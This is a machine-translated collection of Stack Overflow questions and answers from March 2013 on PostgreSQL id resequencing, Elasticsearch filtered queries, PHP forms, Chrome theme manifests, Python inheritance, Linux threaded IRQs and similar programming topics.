> ID：15526813
> 
> 赞同：1
> 
> 时间：2013-03-20T14:47:04.193
> 
> 标签：postgresql, sequence, postgresql-8.4

我正在使用 PostgreSQL 8.4.13 数据库。
最近我在一个表中有大约 8650 万条记录。我几乎全部删除了——现在只剩下 5000 条记录。我跑了：

```
vacuum full 
```

在删除行并将磁盘空间返回给操作系统之后（[感谢 SO 成员的建议](https://stackoverflow.com/questions/15515498/database-table-size-did-not-decrease-proportionately)）

但我看到我的身份证号码仍然停留在数百万。例如：

```
 id   |        date_time        | event_id | secs_since_1970 |    value 
---------+-------------------------+----------+-----------------+-----------
61216287 | 2013/03/18 16:42:42:041 |        6 |   1363646562.04 |   46.4082
61216289 | 2013/03/18 16:42:43:041 |        6 |   1363646563.04 |   55.4496
61216290 | 2013/03/18 16:42:44:041 |        6 |   1363646564.04 |   40.0553
61216291 | 2013/03/18 16:42:45:041 |        6 |   1363646565.04 |   38.5694 
```

为了尝试重新开始剩余行的`id`值，我尝试了：`1`

```
cluster mytable_pkey on mytable; 
```

`mytable`我的桌子的名字在哪里。但这并没有帮助。所以，我的问题是/是：

1.  有没有办法让索引（id 值）再次从 1 开始？
2.  如果我使用新记录添加或更新表，它会从 1 开始还是选择下一个最高整数值（例如上面示例中的 61216292）？

我的表描述如下：里面没有FK约束，也没有序列。

```
jbossql=> \d mytable;
           Table "public.mytable"
 Column      |          Type          | Modifiers 
-----------------+------------------------+-----------
 id              | bigint                 | not null
 date_time       | character varying(255) | 
 event_id        | bigint                 | 
 secs_since_1970 | double precision       | 
 value           | real                   | 
Indexes:
    "mydata_pkey" PRIMARY KEY, btree (id) CLUSTER 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T15:21:26.977

您的主键是使用序列号定义的吗？如果是这样，则会创建一个隐式序列。您可以使用 ALTER SEQUENCE（有关语法，请参见：[http](http://www.postgresql.org/docs/8.2/static/sql-altersequence.html) ://www.postgresql.org/docs/8.2/static/sql-altersequence.html ）将起始编号更改回 1。

基于您还剩下一些记录的事实（只注意到剩下的 5000 条），您不想将该数字重置为剩余记录的最后一个 ID 之前的数字，因为那样该序列将生成非唯一数字。使用序列的意义在于，它为您提供了一种递增数字的事务方式，并保证连续操作获得唯一的递增数字。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T15:47:22.310

```
DROP SCHEMA tmp CASCADE;
CREATE SCHEMA tmp ;
SET search_path=tmp;

        --
        -- Note: "deferrable initially deferred" appears to be the default
        --
CREATE TABLE funky
        ( id SERIAL NOT NULL PRIMARY KEY DEFERRABLE INITIALLY DEFERRED
        , tekst varchar
        );
        -- create some data with gaps in it
INSERT INTO funky(id, tekst)
SELECT  gs, 'Number:' || gs::text
FROM generate_series(1,100,10) gs
        ;

        -- set the sequence to the max occuring id
SELECT setval('funky_id_seq' , mx.mx)
FROM (SELECT max(id) AS mx FROM funky) mx
        ;

SELECT * FROM funky ;

        -- compress the keyspace, making the ids consecutive
UPDATE funky xy
SET id =  self.newid
FROM (
        SELECT id AS id
        , row_number() OVER (ORDER BY id) AS newid
        FROM funky
        ) self
WHERE self.id = xy.id
        ;

        -- set the sequence to the new max occuring id
SELECT setval('funky_id_seq' , mx.mx)
FROM (SELECT max(id) AS mx FROM funky) mx
        ;

SELECT * FROM funky ; 
```

结果：

```
CREATE TABLE
INSERT 0 10
 setval 
--------
     91
(1 row)

 id |   tekst   
----+-----------
  1 | Number:1
 11 | Number:11
 21 | Number:21
 31 | Number:31
 41 | Number:41
 51 | Number:51
 61 | Number:61
 71 | Number:71
 81 | Number:81
 91 | Number:91
(10 rows)

UPDATE 10
 setval 
--------
     10
(1 row)

 id |   tekst   
----+-----------
  1 | Number:1
  2 | Number:11
  3 | Number:21
  4 | Number:31
  5 | Number:41
  6 | Number:51
  7 | Number:61
  8 | Number:71
  9 | Number:81
 10 | Number:91
(10 rows) 
```

警告 警告 警告 警告 警告 ACHTUNG：

更改键值通常是一个**糟糕的主意**。不惜一切代价避免它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-21T11:31:39.363

首先删除主键并创建一个临时序列。

```
alter table mytable drop constraint mydata_pkey;
create temporary sequence temp_seq; 
```

使用序列更新：

```
update mytable
set id = nextval('temp_seq'); 
```

重新创建主键并删除序列

```
alter table mytable add primary key (id);
drop sequence temp_seq; 
```

如果此表有外键依赖，那么您必须先处理它，更新将是一个更复杂的过程。

# php - ZfcUser：我如何进行自己的身份验证？

> ID：15526814
> 
> 赞同：0
> 
> 时间：2013-03-20T14:47:05.747
> 
> 标签：php, zend-framework2, zfcuser

我面临的问题是我必须实现一种方法来针对 SecurityService 对用户进行身份验证，然后从我的数据库中获取一些关于他的数据。

我想使用 ZfcUser 插件，但我对适配器、适配器链和 AuthServices 感到困惑。我真的很希望对这些类以及何时使用它们进行一些澄清，特别是哪一个是我必须用来与我的 SecurityService 通信的类的类型。

# c# - 如何动态指定类库DLL的路径？

> ID：15526824
> 
> 赞同：1
> 
> 时间：2013-03-20T14:47:37.823
> 
> 标签：c#, class, dynamic, dll, load

目标：动态设置类库c#的路径。例如，如果找不到 DLL 的路径。手动查找 DLL 并指定要加载的路径。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:09:40.910

您可以将路径添加到搜索 DLL 的应用程序配置。这是一个例子：

```
<configuration>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="C:\myDLLDirectory\" />
    </assemblyBinding>
  </runtime>
</configuration> 
```

有关更多信息和想法，请参见此处。有几种方法可以做到：http: [//support.microsoft.com/kb/837908](http://support.microsoft.com/kb/837908)

# asp.net-mvc - ASP MVC 与 WebForms：使用 SessionState 进行用户登录

> ID：15526825
> 
> 赞同：1
> 
> 时间：2013-03-20T14:47:40.663
> 
> 标签：asp.net-mvc, authentication, session-state

我有一个关于在将应用程序移植到 MVC 时处理用户登录的问题：

*   在“旧的”WebForm 时代，开发人员只需使用 SessionState 对象将用户设置为已登录，例如，只需将 userobject 放入 SessionState（并且此 userobject 包含简单的属性，例如 name/lastlogon/etc）。

*   这些东西对我们来说效果很好，我已经看到很多应用程序都是这样做的

*   是的，我知道有这个 MembershipProvide-thingy，但我从未使用过它

现在，在 MVC 中，每个人都告诉我“为此使用 SessionStat 很糟糕”和“以这种方式构建的应用程序在设计上存在缺陷”以及“存在大量安全风险”等等。

我使用了这种方法，因为它对应用程序非常可靠，实现起来很简单，并且涵盖了我们需要的所有东西。

（当然，回收网络工作者进程和清空会话是有问题的——但在我们的例子中这不是问题，因为该应用程序在专用机器上为每个国家/地区运行）

我已经阅读了教程，告诉我将这些东西放在数据库中，然后-注意-根据**每个**请求向数据库发出请求以检查用户是否已登录？但是：在任何情况下，这是一种可行的方式，因为我想将数据库请求保持在最低限度。

所以我的问题是：

A）在新的 MVC 应用程序中使用这种方式有什么问题？

B）在新建的 MVC 应用程序中处理这种情况的最佳方法是什么？

关于数据库中会话的想法：我不会这样做，而是设置一个额外的服务，比如通过网络获取查询的“会话管理器”，但是这样简单的请求不应该发送到数据库 - 是这不是个好主意吗？

任何想法，提示/等。非常感谢，因为这种情况真的让我很困惑：-X

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T17:11:36.423

**一个）**

asp.net mvc 框架的一个基本原则是它的无状态。数据使用 http 请求传递并发送到视图模型中的视图。Web 表单尝试使用视图状态等来维护状态，这就是为什么您会在会话方法中看到登录用户的原因。这并不是说 session 不应该完全在 asp.net mvc 中使用，在某些情况下它可能有用。就像维护一个必须在最后一步坚持的 3 步表单流程。但通常我们已经有一个推荐的方式来处理用户登录，那就是[表单身份验证](http://msdn.microsoft.com/en-us/library/system.web.security.formsauthentication.aspx)

**二）**

要访问用户对象，您可以创建一个实现 IPrincipal 接口的[自定义身份](http://msdn.microsoft.com/en-us/library/system.security.principal.iprincipal.aspx)并添加所需的用户字段。[然后在全局过滤器](https://stackoverflow.com/questions/11476301/how-to-create-a-customprincipal-globally-with-and-without-authorizeattribute)中设置自定义身份并在您的操作结果中访问它。关于不想为每个请求查询数据库，为什么不为初始请求调用它，然后缓存结果直到用户更新，然后您可以重新加载对象并再次将其设置为自定义身份。

# postgresql - 如何在表中插入记录

> ID：15526826
> 
> 赞同：0
> 
> 时间：2013-03-20T14:47:41.917
> 
> 标签：postgresql

我正在使用*plpgsql*来执行此操作，但出现错误

***记录类型尚未注册***

这很简单

```
declare
  myrecord RECORD;
begin
  SELECT myrow as "myrow" INTO myrecord FROM (SELECT 1, 2);
  INSERT INTO mytable(col1,col2)
  VALUES (myrecord.*);
end; 
```

可以请任何人帮忙吗？我的 postgres 版本是 8.4

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-23T01:18:45.500

有两种有效的方法可以做到这一点。第一个是：

```
begin
  INSERT INTO mytable(col1,col2)
  VALUES (1, 2);
end; 
```

第二个是：

```
begin
  INSERT INTO mytable(col1,col2)
  SELECT 1, 2;
end; 
```

自然，这些不需要在 pl/pgsql 块中。

顺便说一句，在 psql 工具中，您可以`\h insert`获取有效插入表单的列表。这些是手册中的概要，这是使该工具如此有用的一件事。

# php - PHP MySql $_GET 问题

> ID：15526827
> 
> 赞同：0
> 
> 时间：2013-03-20T14:47:43.553
> 
> 标签：php, html

我试图通过论坛搜索，但我是新手，越来越困惑。

我正在尝试从表单中获取输入并将其用作 MySql 查询中的变量。表格的缩短版本是 -

```
echo "<form  method=\"get\" action=\"\">";
echo "<tr><td>Leave:</td><td><input value=\"".$_SESSION['leave']."\" class=\"text\" autocomplete=\"off\" type=\"text\" value=\"\" /></td></tr>";
echo "</form>"; 
```

然后我尝试使用代码将输入存储到变量中 -

```
$newVar = $_GET['leave']; 
```

但是我收到未定义的索引错误。

有人能帮忙吗？对不起，如果它是一个非常基本的问题:)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-20T14:49:07.167

问题出在你的`HTML`. 您需要将`input`.

```
echo '<input name="leave" class="text" autocomplete="off" type="text" value="' . $_SESSION['leave'] . '" />'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:49:55.823

您两次声明“值”属性，您需要声明名称：

```
echo "<form  method=\"get\" action=\"\">";
echo "<tr><td>Leave:</td><td><input name=\"".$_SESSION['leave']."\" class=\"text\" autocomplete=\"off\" type=\"text\" value=\"\" /></td></tr>";
echo "</form>"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T14:52:06.960

```
echo '<form  method="get" action="">';
echo "<tr><td>Leave:</td><td><input value='{$_SESSION['leave']}' class='text' autocomplete='off' type='text' name='leave'/></td></tr>";
echo "</form>"; 
```

如果你交替使用单引号和双引号，你可以让你的代码看起来更漂亮。

对于您的问题，您缺少输入名称：

```
<input type=".." name="leave" ..> 
```

此外，请注意在您的字段输出中，您将值设置为会话值，并且在末尾附近设置了一个空值。

```
value=\"\" 
```

# javascript - 安装后弹出的谷歌浏览器主题

> ID：15526831
> 
> 赞同：1
> 
> 时间：2013-03-20T14:47:52.473
> 
> 标签：javascript, google-chrome-extension, popup, themes, google-chrome-theme

我正在尝试为谷歌浏览器制作一个主题，但我希望在安装时出现一个弹出窗口。我不确定这是否可能，因为主题与扩展不同。

所以我想用这个清单文件我可以用一个扩展名来做到这一点：

```
{
   "background": {
      "persistent": false,
      "scripts": [ "script.js" ]
   },
   "description": "Een test",
   "manifest_version": 2,
   "name": "Test Extension",
   "version": "0.0.2"
} 
```

在 script.js 中，我得到了以下代码：

```
chrome.runtime.onInstalled.addListener(function(){
  window.open('http://www.example.com','','width=800,height=500');
}); 
```

这一切都很好。现在困难的部分是将其用于主题。问题是当我将主题对象添加到清单文件中时，事情似乎无法正常工作：脚本将不再执行。所以此时我的清单文件如下所示：

```
{
   "background": {
      "persistent": false,
      "scripts": [ "script.js" ]
   },
   "description": "Een test",
   "manifest_version": 2,
   "name": "Test Extension",
   "theme": {
      "colors": {
         "bookmark_text": [ 255, 255, 255 ],
         "frame": [ 12, 20, 30 ],
         "ntp_background": [ 11, 21, 35 ],
         "ntp_header": [ 40, 40, 40 ],
         "ntp_link": [ 0, 0, 0 ],
         "ntp_section": [ 255, 255, 255, 0.5 ],
         "ntp_section_link": [ 0, 0, 0 ],
         "ntp_section_text": [ 0, 0, 0 ],
         "ntp_text": [ 255, 255, 255 ],
         "tab_background_text": [ 10, 10, 10 ],
         "tab_text": [ 255, 255, 255 ],
         "toolbar": [ 6, 13, 21 ]
      },
      "images": {
         "theme_frame": "img/frame.jpg",
         "theme_frame_overlay": "img/frame_overlay.png",
         "theme_ntp_attribution": "img/ntp_attribution.png",
         "theme_ntp_background": "img/ntp_background.jpg",
         "theme_tab_background": "img/tab_background.jpg",
         "theme_tab_background_incognito": "img/tab_background.jpg",
         "theme_toolbar": "img/toolbar.jpg"
      },
      "properties": {
         "ntp_background_alignment": "bottom right",
         "ntp_background_repeat": "no-repeat"
      },
      "tints": {
         "buttons": [ 1, 1, 1 ]
      }
   },
   "version": "0.0.2"
} 
```

我想它不再起作用了，因为该文件现在将被归类为主题。不过，我想我可以在这里发布这个问题。希望大家给点建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T02:44:32.830

使用这个（[http://www.themebeta.com/chrome-theme-creator-online.html](http://www.themebeta.com/chrome-theme-creator-online.html)）来创建你的主题，它也会弹出一个窗口。

# javascript - javascript 中的大字符串以附加电子邮件。

> ID：15526837
> 
> 赞同：3
> 
> 时间：2013-03-20T14:48:04.270
> 
> 标签：javascript, html

我需要使用以下代码将大型文本区域内容附加到邮件中。

```
location.href="mailto:a@example.com?subject=example&body="+encodeURIComponent(document.getElementById("listbox").value); 
```

但是 textarea 字符有一个限制长度，当它超过时，它不起作用。我尝试使用变量并附加到电子邮件；然而，变量也有限制。如何在电子邮件中附加大字符串？感谢帮助...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:15:05.997

您应该能够处理 POST 请求：

```
<form action="mailto:youremail@domain.com">
  <input type="hidden" name="Subject" value="Email subject">
  <input type="hidden" name="Body" value="Email body">
  <input type="submit">
</form> 
```

当然，你也可以在 js 中做到这一点。通过动态创建 DOM 结构并提交表单。

# macos - 全新安装后设置 git

> ID：15526839
> 
> 赞同：1
> 
> 时间：2013-03-20T14:48:08.170
> 
> 标签：macos, git, ssh, repository, ssh-keys

我打算在我的 macbook pro 上安装山狮并擦除硬盘中的所有内容。我目前已经安装了几个 repos 的 git，并且我的 ssh 密钥也与远程 repos 连接。我不确定如何在全新安装 osx 后恢复所有内容。我对 git 不是很精通，所以我可能需要很多帮助。任何帮助，将不胜感激。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:54:14.440

出于安全原因，我建议对当前的**完整硬盘进行备份。**

对于其他存储库的 SSH 访问，您应该将`~/.ssh/id_rsa[.pub]`文件放在手边，因为这是在其他存储库（即 ssh-servers）中识别自己的关键

回购显然应该备份。

全新安装后，您必须安装 git，添加`~/.ssh/id_rsa[.pub]`文件，然后您应该可以运行了。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:53:29.073

确保在擦除硬盘驱动器之前创建 Time Machine 备份。然后在更新后，使用 Time Machine 恢复您的用户数据和本地存储库。

在更新之前，我会创建一个您想要保留的存储库列表并将远程 URL 添加到列表中。如果 Time Machine 恢复无法恢复所有内容，您仍然可能会`git clone`丢失丢失的存储库。

我希望 Time Machine 应该涵盖您正在寻找的大部分内容。

# jquery - Jquery查找所有子链接

> ID：15526842
> 
> 赞同：3
> 
> 时间：2013-03-20T14:48:13.690
> 
> 标签：jquery

在 jquery 我可以找到所有 li 的内容，就像这样

```
$("#myid").closest('li').html()) 
```

如何在 myid li 中找到所有 href？

这是我的html

```
<div id="myid">

            <li> <a href="show1">showroom1</a> </li>
            <li> <a href="show2">showroom2</a> </li>
            <li> <a href="show3">showroom3</a> </li>

            </div> 
```

这段代码 `$("#myid").closest('li').html())`给了我 showroom1、showroom2 和 showroom3。如果我想获得hrefs，我该怎么做。像 show1、show2 和 show3。

我尝试过

```
($("#myid").closest('li').closest('a').attr('href')) 
```

但它从来没有奏效。我不确定。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T14:51:10.147

您可以使用 遍历列表项`.each()`，然后使用 查找 href 值`.attr('href')`。

```
$('#myid li').each(function(){
    console.log( $(this).find('a').attr('href') );
}); 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/A86b2/)**

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:50:55.917

使用该`find`方法，然后遍历 find 返回的项目

```
$(function(){  
   var allAs=$("#myid li").find("a");
   $.each(allAs,function(index,item){
      alert($(item).attr("href"));
   }); 
}); 
```

jsfiddle 示例：http: [//jsfiddle.net/xPa8m/3/](http://jsfiddle.net/xPa8m/3/)

# elasticsearch - 如何搜索一个词并匹配一个布尔条件

> ID：15526844
> 
> 赞同：14
> 
> 时间：2013-03-20T14:48:16.593
> 
> 标签：elasticsearch

我在使用以下语法获得搜索结果方面取得了很大的成功，但我在添加布尔条件时遇到了麻烦。

```
http://localhost:9200/index_name/type_name/_search?q=test 
```

我的文件看起来像：

```
{
    "isbn":"9780307414922",
    "name":"Dark of the Night",
    "adult":false
} 
```

这是我对如何实现我想要做的事情的最佳猜测。

```
{
    "query_string": {
        "default_field": "_all",
         "query": "test"
    },
    "from": 0,
    "size": 20,
    "terms": {
        "adult": true
    }
} 
```

但是，这会导致“解析失败 [No parser for element [query_string]]]; }]”

我正在使用弹性搜索 0.20.5。

**如何以“？q=test”的方式匹配包含搜索词的文档并按文档的成人属性进行过滤？**

提前致谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-20T15:46:47.620

您的`adult == true`子句必须是`query`- 您不能将`term`子句作为顶级参数传递给`search`.

因此，您可以将其作为*查询子句*添加到查询中，在这种情况下，您需要使用`bool`查询连接两个查询子句，如下所示：

```
curl -XGET 'http://127.0.0.1:9200/_all/_search?pretty=1'  -d '
{
   "query" : {
      "bool" : {
         "must" : [
            {
               "query_string" : {
                  "query" : "test"
               }
            },
            {
               "term" : {
                  "adult" : true
               }
            }
         ]
      }
   },
   "from" : 0,
   "size" : 20
}
' 
```

但实际上，查询子句应该用于：

*   全文检索
*   影响相关性分数的从句

但是，您的`adult == true`子句并未用于更改相关性，并且不涉及全文搜索。它更像是一个是/否响应，换句话说，它更适合用作过滤子句。

这意味着您需要将全文查询（`_all`contains `test`）包装在一个同时接受查询和过滤器的查询子句中：`filtered`查询：

```
curl -XGET 'http://127.0.0.1:9200/_all/_search?pretty=1'  -d '
{
   "query" : {
      "filtered" : {
         "filter" : {
            "term" : {
               "adult" : true
            }
         },
         "query" : {
            "query_string" : {
               "query" : "test"
            }
         }
      }
   },
   "from" : 0,
   "size" : 20
}
' 
```

过滤器通常更快，因为：

*   他们不必对文档进行评分，只需包含或排除它们
*   它们可以被缓存和重用

# amazon-web-services - 弹性伸缩与ELB的连接

> ID：15526846
> 
> 赞同：1
> 
> 时间：2013-03-20T14:48:19.930
> 
> 标签：amazon-web-services, amazon-ec2, load-balancing, autoscaling

我读到我们可以将 Auto Scaling 配置为使用 CloudWatch 指标来扩展/或扩展 EC2 实例池。

我很想知道 ELB 如何知道有一个 EC2 实例添加/删除到 Auto Scaling 组，所以它确实将工作负载发送到新添加的实例？（或停止向已删除的实例发送工作负载？）

问候， 帕斯卡

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-21T02:07:37.430

设置它们时，您会将 Auto Scaling 组与 Elastic Load Balancer 关联。然后，Auto Scaling 组会在添加或删除实例时通知 Elastic Load Balancer。

# pixel - 像素移动 C++

> ID：15526857
> 
> 赞同：0
> 
> 时间：2013-03-20T14:48:40.807
> 
> 标签：pixel

这可能是一个非常愚蠢的问题，也可能不是一个非常愚蠢的问题，所以我很抱歉，但我还没有在任何书籍或教程中遇到过这个问题。另外我想它可以适用于任何语言......

假设您创建了一个大小为：的窗口，`640x480`并且在其中创建了一个大小为对象/形状，`32x32`并且您可以使用键盘输入在窗口周围移动形状。

您使用什么`Type`（int，float ...）来控制形状的移动是否重要。显然你不能在一个像素中画出一半，但是如果你将形状移动 0.1f（例如使用`glTranslation`函数）会发生什么应该移动它`int of 1`......它是否将渲染的形状移动了 1/10像素还是？

我希望我已经解释得很好，不会被嘲笑。

我只问这个是因为它会影响碰撞检测的精度以及程序或潜在游戏的其他功能。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:10:38.213

使用浮点数或双精度数来表示定位的最重要原因是背景计算。如果你继续用整数计算你的位置，你不仅可能需要使用转换步骤来回到整数。您还将每 x 步丢失数据

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:03:47.700

glTranslate 通过 xyz 生成翻译。当前矩阵 (glMatrixMode) 与此平移矩阵相乘，乘积替换当前矩阵，就好像使用以下矩阵作为参数调用 glMultMatrix 一样：

1 0 0 x 0 1 0 y 0 0 1 z 0 0 0 1 如果矩阵模式是 GL_MODELVIEW 或 GL_PROJECTION，则在调用 glTranslate 后绘制的所有对象都会被转换。

使用 glPushMatrix 和 glPopMatrix 保存和恢复未平移的坐标系。

这意味着 glTranslate 会给你一个翻译，与当前矩阵一起使用，产生非十进制数字。你不能使用半个像素。glTranslate 接收双精度或浮点数，因此如果您应该在 x、y 或 z 中将其移动 1，只需给函数一个浮点 1 或双精度 1 作为参数。

[http://www.opengl.org/sdk/docs/man2/xhtml/glTranslate.xml](http://www.opengl.org/sdk/docs/man2/xhtml/glTranslate.xml)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-09-17T14:17:48.697

如果你想让你的精灵动画每次更新的移动小于 1 像素，那么是的，你需要使用浮点数，否则你将无法移动。您的绘图函数很可能会四舍五入到最接近的整数，因此它可能与此无关。但是，您当然可以绘制到亚像素精度！

# python - 如何在python中扩展一个类？

> ID：15526858
> 
> 赞同：114
> 
> 时间：2013-03-20T14:48:41.143
> 
> 标签：python, class, interface

在 python 中，你如何扩展一个类？例如，如果我有

颜色.py

```
class Color:
    def __init__(self, color):
        self.color = color
    def getcolor(self):
        return self.color 
```

color_extended.py

```
import Color

class Color:
    def getcolor(self):
        return self.color + " extended!" 
```

但这不起作用......我希望如果我在 中工作`color_extended.py`，那么当我制作一个颜色对象并使用该`getcolor`函数时，它将返回带有字符串“扩展！”的对象。到底。它也应该从导入中得到初始化。

假设 python 3.1

谢谢

* * *

## 回答 #1

> 赞同：112
> 
> 时间：2013-03-20T14:50:09.193

利用：

```
import color

class Color(color.Color):
    ... 
```

如果这是 Python 2.x，您还需要`color.Color`从`object`, 派生以使其成为[新型类](https://stackoverflow.com/questions/54867/old-style-and-new-style-classes-in-python)：

```
class Color(object):
    ... 
```

这在 Python 3.x 中不是必需的。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2020-12-21T20:27:30.777

```
class MyParent:

    def sayHi():
        print('Mamma says hi') 
```

```
from path.to.MyParent import MyParent

class ChildClass(MyParent):
    pass 
```

`ChildClass`然后将继承该`sayHi()`方法的一个实例。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2021-11-05T01:39:48.773

我像这样使用它。

```
class menssagem:
  propriedade1 = "Certo!"
  propriedade2 = "Erro!"

def metodo1(self)
  print(self.propriedade1) 
```

延长。

```
import menssagem
class menssagem2(menssagem):

  menssagem1 = None #não nescessario not necessary

  def __init__(self,menssagem):
    self.menssagem1 = menssagem

  #call first class method
  #usando o metodo da menssagem 1

  def Menssagem(self):
    self.menssagem1.metodo1() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-05-08T15:41:16.393

扩展（特别是添加新方法，而不是更改现有方法）类的另一种方法，甚至是内置类，是使用预处理器添加扩展 Python 本身范围之外/之上的能力，将扩展转换为在 Python 真正看到它之前的正常 Python 语法。

例如，我这样做是为了扩展 Python 2 的`str()`类。`str()`是一个特别有趣的目标，因为隐式链接到引用的数据，例如`'this'`和`'that'`。

这是一些扩展代码，其中唯一添加的非 Python 语法是`extend:testDottedQuad`位：

```
extend:testDottedQuad
def testDottedQuad(strObject):
    if not isinstance(strObject, basestring): return False
    listStrings = strObject.split('.')
    if len(listStrings) != 4: return False
    for strNum in listStrings:
        try:    val = int(strNum)
        except: return False
        if val < 0: return False
        if val > 255: return False
    return True 
```

之后我可以编写馈送到预处理器的代码：

```
if '192.168.1.100'.testDottedQuad():
    doSomething()

dq = '216.126.621.5'
if not dq.testDottedQuad():
    throwWarning();

dqt = ''.join(['127','.','0','.','0','.','1']).testDottedQuad()
if dqt:
    print 'well, that was fun' 
```

预处理器吃掉它，吐出没有猴子补丁的普通 Python，Python 做了我打算做的事情。

正如 ac 预处理器为 c 添加功能一样，Python 预处理器也可以为 Python 添加功能。

我的预处理器实现对于堆栈溢出答案来说太大了，但对于那些可能感兴趣的人，它[在](https://github.com/fyngyrz/pyex)GitHub 上。

# html - CSS background-image 和 html img 标签的图像

> ID：15526861
> 
> 赞同：1
> 
> 时间：2013-03-20T14:48:43.130
> 
> 标签：html, css, background-image, image

用户的浏览器是否加载了用于 img 标签的图像，以及用作 css 类的背景图像的另一个地方，两次？

*   图片的url是一样的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:49:49.827

不，假设 URL 完全相同（包括大小写），图像只会下载一次。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:51:08.320

通常，较新的浏览器倾向于在首次调用图像时对其进行缓存。所以答案是，不，只有一次，除非它是旧版浏览器。

# multithreading - 澄清 request_threaded_irq 的行为

> ID：15526862
> 
> 赞同：6
> 
> 时间：2013-03-20T14:48:44.607
> 
> 标签：multithreading, linux-kernel, linux-device-driver

我已经在网上搜索过，但是对于我遇到的几个相关问题，关于“request_threaded_irq”功能，还没有找到令人信服的答案。

**问题1：** 首先，我正在阅读这篇关于线程IRQ的文章：

[http://lwn.net/Articles/302043/](http://lwn.net/Articles/302043/)

我不清楚这一行：

“只有当处理程序代码通过集成 tasklet/softirq 功能并简化锁定来利用它时，将中断转换为线程才有意义。”

我知道如果我们继续采用“传统”的上半部/下半部方法，我们将需要自旋锁或禁用本地 IRQ 来干预共享数据。但是，我不明白的是，线程中断如何通过集成 tasklet/softirq 功能来简化锁定需求。

**问题2：** 其次，request_threaded_handler 方法比基于 work_queue 的下半部分方法有什么优势（如果有的话）？在这两种情况下，似乎“工作”都被推迟到了一个专用线程。那么区别是什么呢 ？

**问题3：** 最后，在以下原型中：

```
int request_threaded_irq(unsigned int irq, irq_handler_t handler, irq_handler_t thread_fn, unsigned long irqflags, const char *devname, void *dev_id) 
```

是否有可能 IRQ 的“处理程序”部分由相关 IRQ 连续触发（例如 UART 以高速率接收字符），即使“thread_fn”（将 rx'd 字节写入循环缓冲区）部分中断处理程序正忙于处理来自先前唤醒的 IRQ 吗？那么，处理程序不会试图“唤醒”已经运行的“thread_fn”吗？在这种情况下，正在运行的 irq thread_fn 会如何表现？

如果有人能帮助我理解这一点，我将不胜感激。

谢谢，vj

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-05-18T02:42:52.790

对于问题 2，与工作队列不同，创建时设置的 IRQ 线程具有更高的优先级。在`kernel/irq/manage.c`中，您将看到如下代码，用于为线程 IRQ 创建内核线程：

```
 static const struct sched_param param = {
                    .sched_priority = MAX_USER_RT_PRIO/2,
            };

            t = kthread_create(irq_thread, new, "irq/%d-%s", irq,
                               new->name);
            if (IS_ERR(t)) {
                    ret = PTR_ERR(t);
                    goto out_mput;
            }

            sched_setscheduler_nocheck(t, SCHED_FIFO, &param); 
```

在这里可以看到，内核线程的调度策略设置为 RT one ( `SCHED_FIFO`)，并且线程的优先级设置`MAX_USER_RT_PRIO/2`为高于常规进程。

对于问题 3，您描述的情况也可能发生在正常中断的情况下。通常在内核中，中断在 ISR 执行时被禁用。在 ISR 执行期间，字符可能会不断填充设备的缓冲区，并且即使在中断被禁用时，设备也可以并且必须继续断言中断。

设备的工作是确保 IRQ 线保持有效，直到读取所有字符并且 ISR 完成任何处理。同样重要的是中断是电平触发的，或者取决于设计被中断控制器锁存。

最后，设备/外设应具有足够大小的 FIFO，以便高速传输的字符不会被慢 ISR 丢失。ISR 还应设计为在执行时读取尽可能多的字符。

一般来说，我所看到的是，控制器会有一个特定大小`X`的 FIFO，当 FIFO 被填满时`X/2`，它会触发一个中断，导致 ISR 获取尽可能多的数据。ISR 尽可能多地读取，然后清除中断。同时，如果 FIFO 仍然是`X/2`，设备将保持中断线有效，从而导致 ISR 再次执行。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-29T05:42:03.590

对于第 3 个问题，当一个 threadedirq 被激活时，相应的中断线被屏蔽/禁用。当 threadedirq 运行并完成时，它会在它的末尾启用它。因此，当相应的 threadedirq 运行时，不会有任何中断触发。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-20T18:08:48.973

1.  以前，下半部不是 a `task`，仍然[无法阻挡](http://lwn.net/Articles/239633/)。唯一的区别是中断被禁用。*tasklet*或*softirq允许在驱动程序的**ISR 线程*和用户 API（`ioctl()`、`read()`和`write()`）之间进行不同的互锁。
2.  我认为这`work queue`几乎是等价的。但是，*tasklet/ksoftirq*具有高优先级，并被该处理器上所有基于 ISR 的功能使用。这可以提供更好的调度机会。此外，驱动程序管理的更少；一切都已内置到内核的 ISR 处理程序代码中。
3.  你必须处理这个。通常可以使用[*乒乓*](http://en.wikipedia.org/wiki/Multiple_buffering)`kfifo`缓冲区或像您建议的那样。应该是贪婪的`handler`，并在返回之前从 UART 获取所有数据`IRQ_WAKE_THREAD`。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-03-25T08:10:53.547

